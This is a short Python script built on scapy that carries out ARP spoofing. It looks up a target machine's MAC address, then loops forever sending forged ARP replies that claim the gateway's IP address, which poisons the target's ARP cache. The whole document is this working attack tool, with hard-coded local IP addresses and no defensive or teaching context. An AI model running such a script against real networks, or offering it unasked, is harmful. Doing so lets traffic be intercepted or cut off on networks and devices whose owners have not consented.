import scapy.all as scapy

def spoof(target_ip, target_mac, spoof_ip):
    ARP_packet = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = "is-at")
    scapy.send(ARP_packet, verbose = 0)

def get_mac(ip):
    arp_request = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst = ip)
    reply, x = scapy.srp(arp_request, timeout = 5, verbose = 0)
    if reply:
        return reply[0][1].src
    return None

default_gateway_ip = "192.168.137.255"
target_ip = "192.168.68.108"
target_mac = None

if __name__ == "__main__":
    while not target_mac:
        target_mac = get_mac(target_ip)
        if not target_mac:
            print("MAC adress was not found")
            exit(1)
    print("The target MAC adress is: {}".format(target_mac))
    while True:
        spoof(target_ip, target_mac, default_gateway_ip)
        print("Spoofing is active")